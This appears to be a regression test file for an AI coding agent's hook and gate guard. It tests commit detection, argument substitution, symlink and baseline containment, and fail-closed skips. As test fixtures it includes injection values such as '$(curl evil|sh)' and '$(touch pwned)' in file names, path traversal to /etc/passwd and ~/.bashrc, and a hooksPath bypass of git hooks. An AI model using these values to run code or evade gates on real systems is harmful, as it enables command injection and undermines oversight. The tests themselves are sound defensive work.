// Regression tests for the gate fixes of the 2026-10-06 review (hooks-guard): H01 baseline containment, H02 symlink
// reads, M08 `git -C/-c commit`, M09/S13 `{file}` substitution, M10 position-free baselines, M11 module provider gates,
// M12 baseline before the first edit, M13 write gates after the edit, S5 bare binaries, S6 failClosed and visible
// skips, L03 concurrent bootstrap.
import { describe, expect } from 'claude-code/testing'

import { HOME, ROOT, mountRepo, test } from './testkit.ts'
import { expandArgv, freshViolations, isGitCommit, violationKey } from './layers/gates.ts'
import { bareBinary } from './layers/host.ts'

const BASE = {
  groups: {},
  tiers: { premium: { groups: [] }, standard: { groups: [] }, quick: { groups: [] } },
  profiles: {},
}
const SLOW = { timeoutMs: 20_000 }
const TRUSTED = { ...SLOW, options: { trustBuild: 'always', allowScripts: true } }
const BASH = (command: string, id = 't1') => ({ tool: 'Bash', tool_use_id: id, command }) as const
const OK = { result: { stdout: '', stderr: '', interrupted: false } }

describe('pure helpers', () => {
  test('M08: isGitCommit sees every spelling git accepts, and nothing else', async () => {
    const cases: [string, boolean][] = [
      ['git commit -m wip', true],
      ['git -C /repo commit -m wip', true],
      ['git -c core.hooksPath=/dev/null commit -m x', true],
      ['git --git-dir=.git --work-tree . commit', true],
      ['git --no-pager -C sub commit --amend', true],
      ['npm test && git commit -am "fix && more"', true],
      ['cd sub; GIT_AUTHOR_NAME=x git commit -m x', true],
      ['sudo -u bob git commit -m x', true],
      ['echo $(git -C . commit -m x)', true],
      ['/usr/bin/git commit', true],
      ['bash -c "git commit -m x"', true],
      ["sh -c 'git commit -m x'", true],
      ['eval "git commit -m x"', true],
      ['/bin/bash -lc "cd sub && git -C . commit"', true],
      ['xargs sh -c \'git commit -m "$0"\'', true],
      ['bash -c "git status"', false],
      ['git commit-tree HEAD^{tree}', false],
      ['git status', false],
      ['git log --grep commit', false],
      ['grep "git commit" notes.md', false],
      ['gitk commit', false],
    ]
    for (const [cmd, want] of cases) expect([cmd, isGitCommit(cmd)]).toEqual([cmd, want])
  })

  test('M09/S13: expandArgv keeps paths as single argv words and refuses shell syntax inside a larger element', async () => {
    const cases: [string[], string | undefined, string[] | 'error'][] = [
      [['eslint', '{file}'], 'src/a.ts', ['eslint', 'src/a.ts']],
      [['eslint', '{file}'], '-rf.ts', ['eslint', './-rf.ts']],
      [['eslint', '{file}'], 'src/$(curl evil|sh).ts', ['eslint', 'src/$(curl evil|sh).ts']],
      [['sh', '-c', 'prettier --check {file}'], 'src/a.ts', ['sh', '-c', 'prettier --check src/a.ts']],
      [['sh', '-c', 'prettier --check {file}'], 'src/x$(curl evil|sh).ts', 'error'],
      [['sh', '-c', 'lint {file}'], 'src/a b.ts', 'error'],
      [['tool', '--file={file}'], 'src/a$&b.ts', 'error'],
      [['eslint', '{file}'], '../outside.ts', 'error'],
      [['eslint', '{file}'], '/etc/passwd', 'error'],
      [['tsc', '--noEmit'], undefined, ['tsc', '--noEmit']],
    ]
    for (const [argv, file, want] of cases) {
      const r = expandArgv(argv, { file, changed: [] })
      expect([argv, file, 'error' in r ? 'error' : r.argv]).toEqual([argv, file, want])
    }
    const r = expandArgv(['pnpm', 'test', '--', '{changedPaths}'], { changed: ['src/a.ts', '-x.ts', '../y.ts', '/abs.ts'] })
    expect('argv' in r ? r.argv : r).toEqual(['pnpm', 'test', '--', 'src/a.ts', './-x.ts'])
  })

  test('M10: a shifted line keeps a known violation known; counts and new messages still count', async () => {
    const cases: [string[], string[], string[]][] = [
      [['src/a.ts(3,1): error TS2304: x'], ['src/a.ts(4,1): error TS2304: x'], []],
      [['src/a.ts:3:1: no-unused-vars'], ['src/a.ts:9:5: no-unused-vars'], []],
      [['{"file":"a.ts","line":3,"rule":"r1"}'], ['{"rule":"r1","line":7,"file":"a.ts"}'], []],
      [['a.ts(3,1): error TS1'], ['a.ts(3,1): error TS1', 'a.ts(8,1): error TS1'], ['a.ts(8,1): error TS1']],
      [['a.ts(3,1): error TS1'], ['b.ts(3,1): error TS1'], ['b.ts(3,1): error TS1']],
      [[], ['x'], ['x']],
    ]
    for (const [known, current, want] of cases) expect(freshViolations(current, known)).toEqual(want)
    expect(violationKey('  3:1  error  Unexpected any  @typescript-eslint/no-explicit-any')).toBe('error Unexpected any @typescript-eslint/no-explicit-any')
  })

  test('S5: only a bare command name may start (no path in argv[0])', async () => {
    const cases: [string[], boolean][] = [[['node', 'x'], true], [['./tools/node'], false], [['/tmp/evil/node'], false], [['C:\\x\\node.exe'], false], [[''], false], [[], false]]
    for (const [argv, want] of cases) expect([argv, bareBinary(argv)]).toEqual([argv, want])
  })
})

describe('H01: gates[].baseline stays inside the repo', () => {
  const report = JSON.stringify({ violations: ['$(curl evil|sh)'] })
  const cases: { name: string; baseline: string; trusted: boolean; links?: Record<string, string> }[] = [
    { name: 'absolute path, untrusted', baseline: `${HOME}/.bashrc`, trusted: false },
    { name: '.. path, untrusted', baseline: '../../home/test/.bashrc', trusted: false },
    { name: 'absolute path, trusted', baseline: `${HOME}/.bashrc`, trusted: true },
    { name: 'repo path, untrusted (memory only)', baseline: '.claude/gate.baseline.json', trusted: false },
    { name: 'symlink inside the repo to a file outside, trusted', baseline: '.claude/base.json', trusted: true, links: { '.claude/base.json': `${HOME}/.bashrc` } },
  ]
  for (const c of cases) {
    test(`${c.name}: nothing is written outside the repo (nor into an untrusted repo)`, { ...SLOW, ...(c.trusted ? { options: { trustBuild: 'always' } } : {}) }, async ($, on) => {
      const cfg = { ...BASE, providers: { arch: { kind: 'file', path: 'report.json' } }, gates: [{ name: 'pwn', on: 'prompt', provider: 'arch', pass: 'len(result.violations) == 0', onlyNew: true, baseline: c.baseline }] }
      const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'report.json': report, [`${HOME}/.bashrc`]: 'export PS1=x' }, links: c.links })
      on('prompt.submit', ($, e) => ({ text: e.text }))
      await $.prompt.submit({ text: 'привіт', wait: false, origin: { kind: 'composer' } })
      expect(repo.files.get(`${HOME}/.bashrc`)?.text).toBe('export PS1=x')
      if (!c.trusted) expect([...repo.files.keys()].filter((k) => k.includes('baseline'))).toEqual([])
    })
  }

  test('a trusted repo writes its baseline inside the repo', { ...SLOW, options: { trustBuild: 'always' } }, async ($, on) => {
    const cfg = { ...BASE, providers: { arch: { kind: 'file', path: 'report.json' } }, gates: [{ name: 'arch', on: 'prompt', provider: 'arch', pass: 'len(result.violations) == 0', onlyNew: true }] }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'report.json': report } })
    on('prompt.submit', ($, e) => ({ text: e.text }))
    await $.prompt.submit({ text: 'привіт', wait: false, origin: { kind: 'composer' } })
    expect(JSON.parse(repo.files.get('.claude/gate.baseline.json')?.text ?? '{}')).toEqual({ arch: ['$(curl evil|sh)'] })
  })
})

describe('H02: provider files behind a symlink', () => {
  test('a symlink inside the repo to a file outside is not read (the gate is skipped, visibly)', SLOW, async ($, on) => {
    const cfg = { ...BASE, providers: { arch: { kind: 'file', path: 'report.json' } }, gates: [{ name: 'architecture', on: 'commit', provider: 'arch', pass: 'len(result.violations) == 0', message: 'leak: {{ result.violations[0] }}' }] }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), [`${HOME}/secret.json`]: '{"violations":["SECRET"]}' }, links: { 'report.json': `${HOME}/secret.json` } })
    on('tool.call', () => OK as never)
    const r = await $.tool.call(BASH('git commit -m x'))
    expect(r.deny).toBeUndefined()
    expect(repo.toasts.some((t) => t.includes('гейт architecture пропущено'))).toBe(true)
  })

  test('the same file inside the repo is read', SLOW, async ($, on) => {
    const cfg = { ...BASE, providers: { arch: { kind: 'file', path: 'report.json' } }, gates: [{ name: 'architecture', on: 'commit', provider: 'arch', pass: 'len(result.violations) == 0', message: 'v: {{ result.violations[0] }}' }] }
    mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'data/r.json': '{"violations":["X1"]}' }, links: { 'report.json': `${ROOT}/data/r.json` } })
    on('tool.call', () => OK as never)
    expect((await $.tool.call(BASH('git commit -m x'))).deny).toBe('v: X1')
  })
})

describe('commit gates (M08, S5, S6, L03)', () => {
  const tests = (extra: Record<string, unknown> = {}) => ({ ...BASE, gates: [{ name: 'tests', on: 'commit', run: ['npm', 'test'], ...extra }] })

  test('M08: `git -C <dir> commit` and `git -c k=v commit` run the commit gates', TRUSTED, async ($, on) => {
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(tests()) }, allowBinaries: ['npm'], run: () => ({ exitCode: 1, stdout: 'FAIL', stderr: '' }) })
    on('tool.call', () => OK as never)
    expect((await $.tool.call(BASH(`git -C ${ROOT} commit -m wip`))).deny).toContain('Гейт tests не пройдено')
    expect((await $.tool.call(BASH('git -c core.hooksPath=/dev/null commit -m x', 't2'))).deny).toContain('Гейт tests не пройдено')
    expect((await $.tool.call(BASH('git commit-tree abc', 't3'))).deny).toBeUndefined()
    expect(repo.runs).toHaveLength(2)
  })

  test('S5: a path in argv[0] never starts, even when its basename is whitelisted', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'tests', on: 'commit', run: ['./tools/npm', 'test'] }] }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg) }, allowBinaries: ['npm'] })
    on('tool.call', () => OK as never)
    expect((await $.tool.call(BASH('git commit -m x'))).deny).toBeUndefined()
    expect(repo.runs).toHaveLength(0)
    expect(repo.toasts.some((t) => t.includes('гейт tests пропущено'))).toBe(true)
  })

  test('S6: a skipped gate is shown once; with failClosed it blocks', SLOW, async ($, on) => {
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify({ ...BASE, gates: [{ name: 'tests', on: 'commit', run: ['npm', 'test'] }, { name: 'must', on: 'commit', run: ['npm', 'run', 'must'], failClosed: true }] }) } })
    on('tool.call', () => OK as never)
    const r = await $.tool.call(BASH('git commit -m x'))
    expect(r.deny).toContain('Гейт must не виконано (репозиторій не довірений)')
    await $.tool.call(BASH('git commit -m x', 't2'))
    expect(repo.toasts.filter((t) => t.includes('гейт tests пропущено'))).toHaveLength(1)
    expect(repo.runs).toHaveLength(0)
  })

  test('L03: parallel commits on a fresh runtime are all gated', TRUSTED, async ($, on) => {
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(tests()) }, allowBinaries: ['npm'], run: () => ({ exitCode: 1, stdout: 'FAIL', stderr: '' }) })
    on('tool.call', () => OK as never)
    const rs = await Promise.all([$.tool.call(BASH('git commit -m a', 'p1')), $.tool.call(BASH('git commit -m b', 'p2')), $.tool.call(BASH('git commit -m c', 'p3'))])
    expect(rs.map((r) => typeof r.deny === 'string' && r.deny.includes('Гейт tests'))).toEqual([true, true, true])
    expect(repo.runs).toHaveLength(3)
  })
})

describe('M11: module provider gates', () => {
  test('a gate on a `<prompt dir>/lib` module runs the module (trusted) and blocks on its data', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'architecture', on: 'commit', provider: 'arch', pass: 'len(result.violations) == 0', message: 'arch: {{ result.violations[0] }}' }] }
    const repo = mountRepo(on, {
      files: { '.claude/gate.json': JSON.stringify(cfg), '.claude/prompt/lib/arch.mjs': 'export default () => ({ violations: ["K101"] })' },
      run: () => ({ exitCode: 0, stdout: JSON.stringify({ results: [{ violations: ['K101'] }], errors: [null] }), stderr: '' }),
    })
    on('tool.call', () => OK as never)
    expect((await $.tool.call(BASH('git commit -m x'))).deny).toBe('arch: K101')
    expect(repo.runs[0]?.[0]).toBe('node')
  })

  test('the same gate in an untrusted repo runs nothing and says it was skipped', SLOW, async ($, on) => {
    const cfg = { ...BASE, providers: { arch: { kind: 'module', path: 'tools/arch.mjs' } }, gates: [{ name: 'architecture', on: 'commit', provider: 'arch', pass: 'len(result.violations) == 0' }] }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'tools/arch.mjs': 'export default {}' } })
    on('tool.call', () => OK as never)
    expect((await $.tool.call(BASH('git commit -m x'))).deny).toBeUndefined()
    expect(repo.runs).toHaveLength(0)
    expect(repo.toasts.some((t) => t.includes('гейт architecture пропущено'))).toBe(true)
  })
})

describe('write gates after the edit (M13) and baselines before it (M12)', () => {
  test('M13: a write gate checks the file after the edit; a failure is context, not a deny', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'lint', on: 'write', run: ['eslint', '{file}'] }] }
    const order: string[] = []
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'src/a.ts': 'clean' }, allowBinaries: ['eslint'], run: (argv) => { order.push(`run ${argv.join(' ')}`); return { exitCode: 1, stdout: 'src/a.ts:1:1 no-any', stderr: '' } } })
    on('tool.call', ($, e) => { order.push(`edit ${e.tool}`); repo.files.set('src/a.ts', { text: 'broken', mtimeMs: 2 }); return OK as never })
    const r = await $.tool.call({ tool: 'Write', tool_use_id: 'w1', file_path: `${ROOT}/src/a.ts`, content: 'broken' } as never)
    expect(r.deny).toBeUndefined()
    expect(order).toEqual(['edit Write', 'run eslint src/a.ts'])
    expect(('context' in r ? r.context ?? [] : []).join('\n')).toContain('Гейт lint не пройдено')
  })

  test('M13: a write to a path with shell syntax never reaches a `sh -c` gate', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'fmt', on: 'write', run: ['sh', '-c', 'prettier --check {file}'] }] }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg) }, allowBinaries: ['sh'] })
    on('tool.call', () => OK as never)
    const r = await $.tool.call({ tool: 'Write', tool_use_id: 'w1', file_path: `${ROOT}/src/x$(touch pwned).ts`, content: '' } as never)
    expect(repo.runs).toHaveLength(0)
    expect(('context' in r ? r.context ?? [] : []).join('\n')).toContain('не можна безпечно підставити')
  })

  test('M12: the baseline is taken before the first edit, so the session\'s own regression is new', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'tc', on: 'commit', run: ['tsc', '--noEmit'], onlyNew: true }] }
    let out = { exitCode: 0, stdout: '', stderr: '' }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'src/a.ts': 'ok' }, allowBinaries: ['tsc'], run: () => out })
    on('tool.call', () => OK as never)
    await $.tool.call({ tool: 'Read', tool_use_id: 'r1', file_path: `${ROOT}/src/a.ts` } as never)
    await $.tool.call({ tool: 'Edit', tool_use_id: 'e1', file_path: `${ROOT}/src/a.ts`, old_string: 'ok', new_string: 'bad' } as never)
    // A clean baseline stays in memory: no new file in git status, no snapshot pinned for later sessions.
    expect(repo.files.has('.claude/gate.baseline.json')).toBe(false)
    out = { exitCode: 2, stdout: 'src/a.ts(3,1): error TS2304: x', stderr: '' }
    expect((await $.tool.call(BASH('git commit -m x'))).deny).toContain('src/a.ts(3,1): error TS2304')
  })

  test('M12: a `{file}` gate keeps the state before the first edit of the file: edit 1\'s violation is still new at edit 2', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'lint', on: 'write', run: ['eslint', '{file}'], onlyNew: true }] }
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'src/a.ts': 'clean' }, allowBinaries: ['eslint'], run: () => (repo.files.get('src/a.ts')?.text === 'clean' ? { exitCode: 0, stdout: '', stderr: '' } : { exitCode: 1, stdout: 'src/a.ts:1:1 no-any', stderr: '' }) })
    let n = 0
    on('tool.call', () => { repo.files.set('src/a.ts', { text: `broken ${++n}`, mtimeMs: 10 + n }); return OK as never })
    const ctx = (r: object) => ('context' in r ? ((r as { context?: string[] }).context ?? []) : []).join('\n')
    const r1 = await $.tool.call({ tool: 'Write', tool_use_id: 'w1', file_path: `${ROOT}/src/a.ts`, content: 'x' } as never)
    expect(ctx(r1)).toContain('no-any')
    const r2 = await $.tool.call({ tool: 'Write', tool_use_id: 'w2', file_path: `${ROOT}/src/a.ts`, content: 'y' } as never)
    expect(ctx(r2)).toContain('no-any')
  })

  test('M12: a legacy failure before any edit becomes the baseline; a shifted line stays known (M10)', TRUSTED, async ($, on) => {
    const cfg = { ...BASE, gates: [{ name: 'tc', on: 'commit', run: ['tsc', '--noEmit'], onlyNew: true }] }
    let out = { exitCode: 2, stdout: 'src/a.ts(3,1): error TS2304: x', stderr: '' }
    mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'src/a.ts': 'ok' }, allowBinaries: ['tsc'], run: () => out })
    on('tool.call', () => OK as never)
    await $.tool.call({ tool: 'Read', tool_use_id: 'r1', file_path: `${ROOT}/src/a.ts` } as never)
    await $.tool.call({ tool: 'Edit', tool_use_id: 'e1', file_path: `${ROOT}/src/a.ts`, old_string: 'ok', new_string: 'ok2' } as never)
    out = { exitCode: 2, stdout: 'src/a.ts(4,1): error TS2304: x', stderr: '' }
    expect((await $.tool.call(BASH('git commit -m x'))).deny).toBeUndefined()
  })
})
